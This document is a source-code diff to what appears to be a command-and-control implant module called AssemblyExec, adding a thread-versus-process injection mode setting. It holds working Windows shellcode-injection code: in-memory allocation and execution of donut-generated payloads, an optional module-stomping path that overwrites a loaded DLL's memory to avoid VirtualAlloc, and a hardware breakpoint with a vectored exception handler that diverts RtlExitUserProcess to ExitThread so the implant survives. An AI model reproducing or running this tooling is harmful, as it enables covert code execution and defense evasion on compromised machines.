@@ -60,6 +60,7 @@ AssemblyExec::AssemblyExec()
 {
 	m_processToSpawn="";
 	m_useSyscall=false;
+	m_isModeProcess = true;
 }
 
 AssemblyExec::~AssemblyExec()
@@ -77,6 +78,8 @@ std::string AssemblyExec::getInfo()
 	info += "Use -r to use a shellcode file.\n";
 	info += "If -e or -d are given, use donut to create the shellcode.\n";
 	info += "exemple:\n";
+	info += "- assemblyExec thread/process\n";
+	info += "- assemblyExec setProcess\n";
 	info += "- assemblyExec -r ./shellcode.bin\n";
 	info += "- assemblyExec -e ./program.exe arg1 arg2...\n";
 	info += "- assemblyExec -e ./Seatbelt.exe -group=system\n";
@@ -86,10 +89,32 @@ std::string AssemblyExec::getInfo()
 }
 
 
+#define modeThread "0"
+#define modeProcess "1"
+
+
 int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
-	if (splitedCmd.size() >= 3)
+	if(splitedCmd.size() == 2)
+	{
+		if(splitedCmd[1]=="thread")
+		{
+			m_isModeProcess = false;
+			return 0;
+		}
+		else if(splitedCmd[1]=="process")
+		{
+			m_isModeProcess = true;
+			return 0;
+		}
+		else
+		{
+			c2Message.set_returnvalue(getInfo());
+			return -1;
+		}
+	}
+	else if (splitedCmd.size() >= 3)
 	{
 		bool donut=false;
 		std::string inputFile=splitedCmd[2];
@@ -167,8 +192,6 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 			// if we create a process we need to exite process with donut shellcode
 			// Otherwise we exite the thread
 			creatShellCodeDonut(inputFile, method, args, payload, true);
-
-			// creatShellCodeDonut(inputFile, method, args, payload, false);
 		}
 		else
 		{
@@ -191,6 +214,10 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 			cmd+=" ";
 		}
 
+		if(m_isModeProcess == false)
+			c2Message.set_args(modeThread);
+		else
+			c2Message.set_args(modeProcess);
 		c2Message.set_pid(pid);
 		c2Message.set_cmd(cmd);
 		c2Message.set_instruction(splitedCmd[0]);
@@ -224,6 +251,15 @@ int AssemblyExec::initConfig(const nlohmann::json &config)
 
 int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
+	std::string mode = c2Message.args();
+	if(!mode.empty())
+	{
+		if(mode==modeThread)
+			m_isModeProcess = false;
+		else if(mode==modeProcess)
+			m_isModeProcess = true;
+	}
+
 	const std::string payload = c2Message.data();
 
 	std::string result;
@@ -314,16 +350,12 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #elif _WIN32
 
-	bool isInjectIntoNewProcess=true;
 	std::string processToSpawn="notepad.exe";
 	if(!m_processToSpawn.empty())
 		processToSpawn=m_processToSpawn;
 
-	// if we create a process we need to exite process with donut shellcode
-	if(isInjectIntoNewProcess)
+	if(m_isModeProcess)
 		createNewProcess(payload, processToSpawn, result);
-
-	// Otherwise we exite the thread
 	else
 		createNewThread(payload, result);
 
@@ -339,6 +371,59 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 #ifdef _WIN32
 
 
+LONG WINAPI handlerRtlExitUserProcess(EXCEPTION_POINTERS * ExceptionInfo) 
+{
+	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
+	{
+		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
+		if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
+		{
+			// printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
+			// printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
+			// printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
+			// printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
+			// printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
+			// printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
+			
+			// printf("RtlExitUserProcess called!\n");
+			
+			// continue the execution
+			ExceptionInfo->ContextRecord->EFlags |= (1 << 16);			// set RF (Resume Flag) to continue execution
+			//ExceptionInfo->ContextRecord->Rip++;						// or skip the breakpoint via instruction pointer
+			ExceptionInfo->ContextRecord->Rip = (DWORD64)GetProcAddress(GetModuleHandle("Kernel32.dll"), "ExitThread");
+		}		
+		return EXCEPTION_CONTINUE_EXECUTION;
+	}
+	return EXCEPTION_CONTINUE_SEARCH;
+}
+
+
+int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP) 
+{
+	CONTEXT ctx = { 0 };
+	ctx.ContextFlags = CONTEXT_ALL;
+
+	GetThreadContext(thrd, &ctx);
+	
+	if (setBP == TRUE) {
+		ctx.Dr0 = addr;
+		ctx.Dr7 |= (1 << 0);  		// Local DR0 breakpoint
+		ctx.Dr7 &= ~(1 << 16);		// break on execution
+		ctx.Dr7 &= ~(1 << 17);
+
+	}
+	else if (setBP == FALSE) {
+		ctx.Dr0 = NULL;
+		ctx.Dr7 &= ~(1 << 0);
+	}
+
+	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;	
+	SetThreadContext(thrd, &ctx);
+
+	return 0;
+}
+
+
 // Create new thread to run the shellcode, the memory use to inject the payload is taken from a DLL (Module Stomping)
 // loaded specialy for this purpose. It avoid to use VirtualAlloc.
 int AssemblyExec::createNewThread(const std::string& payload, std::string& result)
@@ -346,19 +431,38 @@ int AssemblyExec::createNewThread(const std::string& payload, std::string& resul
 	StdCapture stdCapture;
 	stdCapture.BeginCapture();
 
+	char * ptr;
+	
 	// Module stomping
-	unsigned char sLib[] = "HologramWorld.dll";
-	HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
-	char * ptr = (char *) hVictimLib + 2*4096 + 12;
+	bool isModuleStomping = false;
+	if(isModuleStomping)
+	{
+		unsigned char sLib[] = "HologramWorld.dll";
+		HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
+		ptr = (char *) hVictimLib + 2*4096 + 12;
 
-	// Alloc memory
-	// char * ptr = (char *) VirtualAlloc(NULL, payload.size()+4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		DWORD oldprotect = 0;
+		VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_READWRITE, &oldprotect);
+		RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
+	    VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_EXECUTE_READ, &oldprotect);
+	}
+	else
+	{
+		DWORD oldprotect = 0;
+		ptr = (char *) VirtualAlloc(NULL, payload.size()+4096, MEM_COMMIT, PAGE_READWRITE);
+		RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
+	    VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_EXECUTE_READ, &oldprotect);
+	}
+	
+	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, CREATE_SUSPENDED, 0);
 
-	DWORD oldprotect = 0;
-	VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_READWRITE, &oldprotect);
-	RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
-	VirtualProtect((char *) ptr, payload.size() + 4096, oldprotect, &oldprotect);
-	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);
+	AddVectoredExceptionHandler(0, &handlerRtlExitUserProcess);
+	BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
+	DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);
+	SetHWBP(thread, (DWORD64) dword64Address, TRUE);
+
+	if (thread != NULL) 
+		ResumeThread(thread);
 
 	WaitForSingleObject(thread, maxDurationShellCode*1000);
 
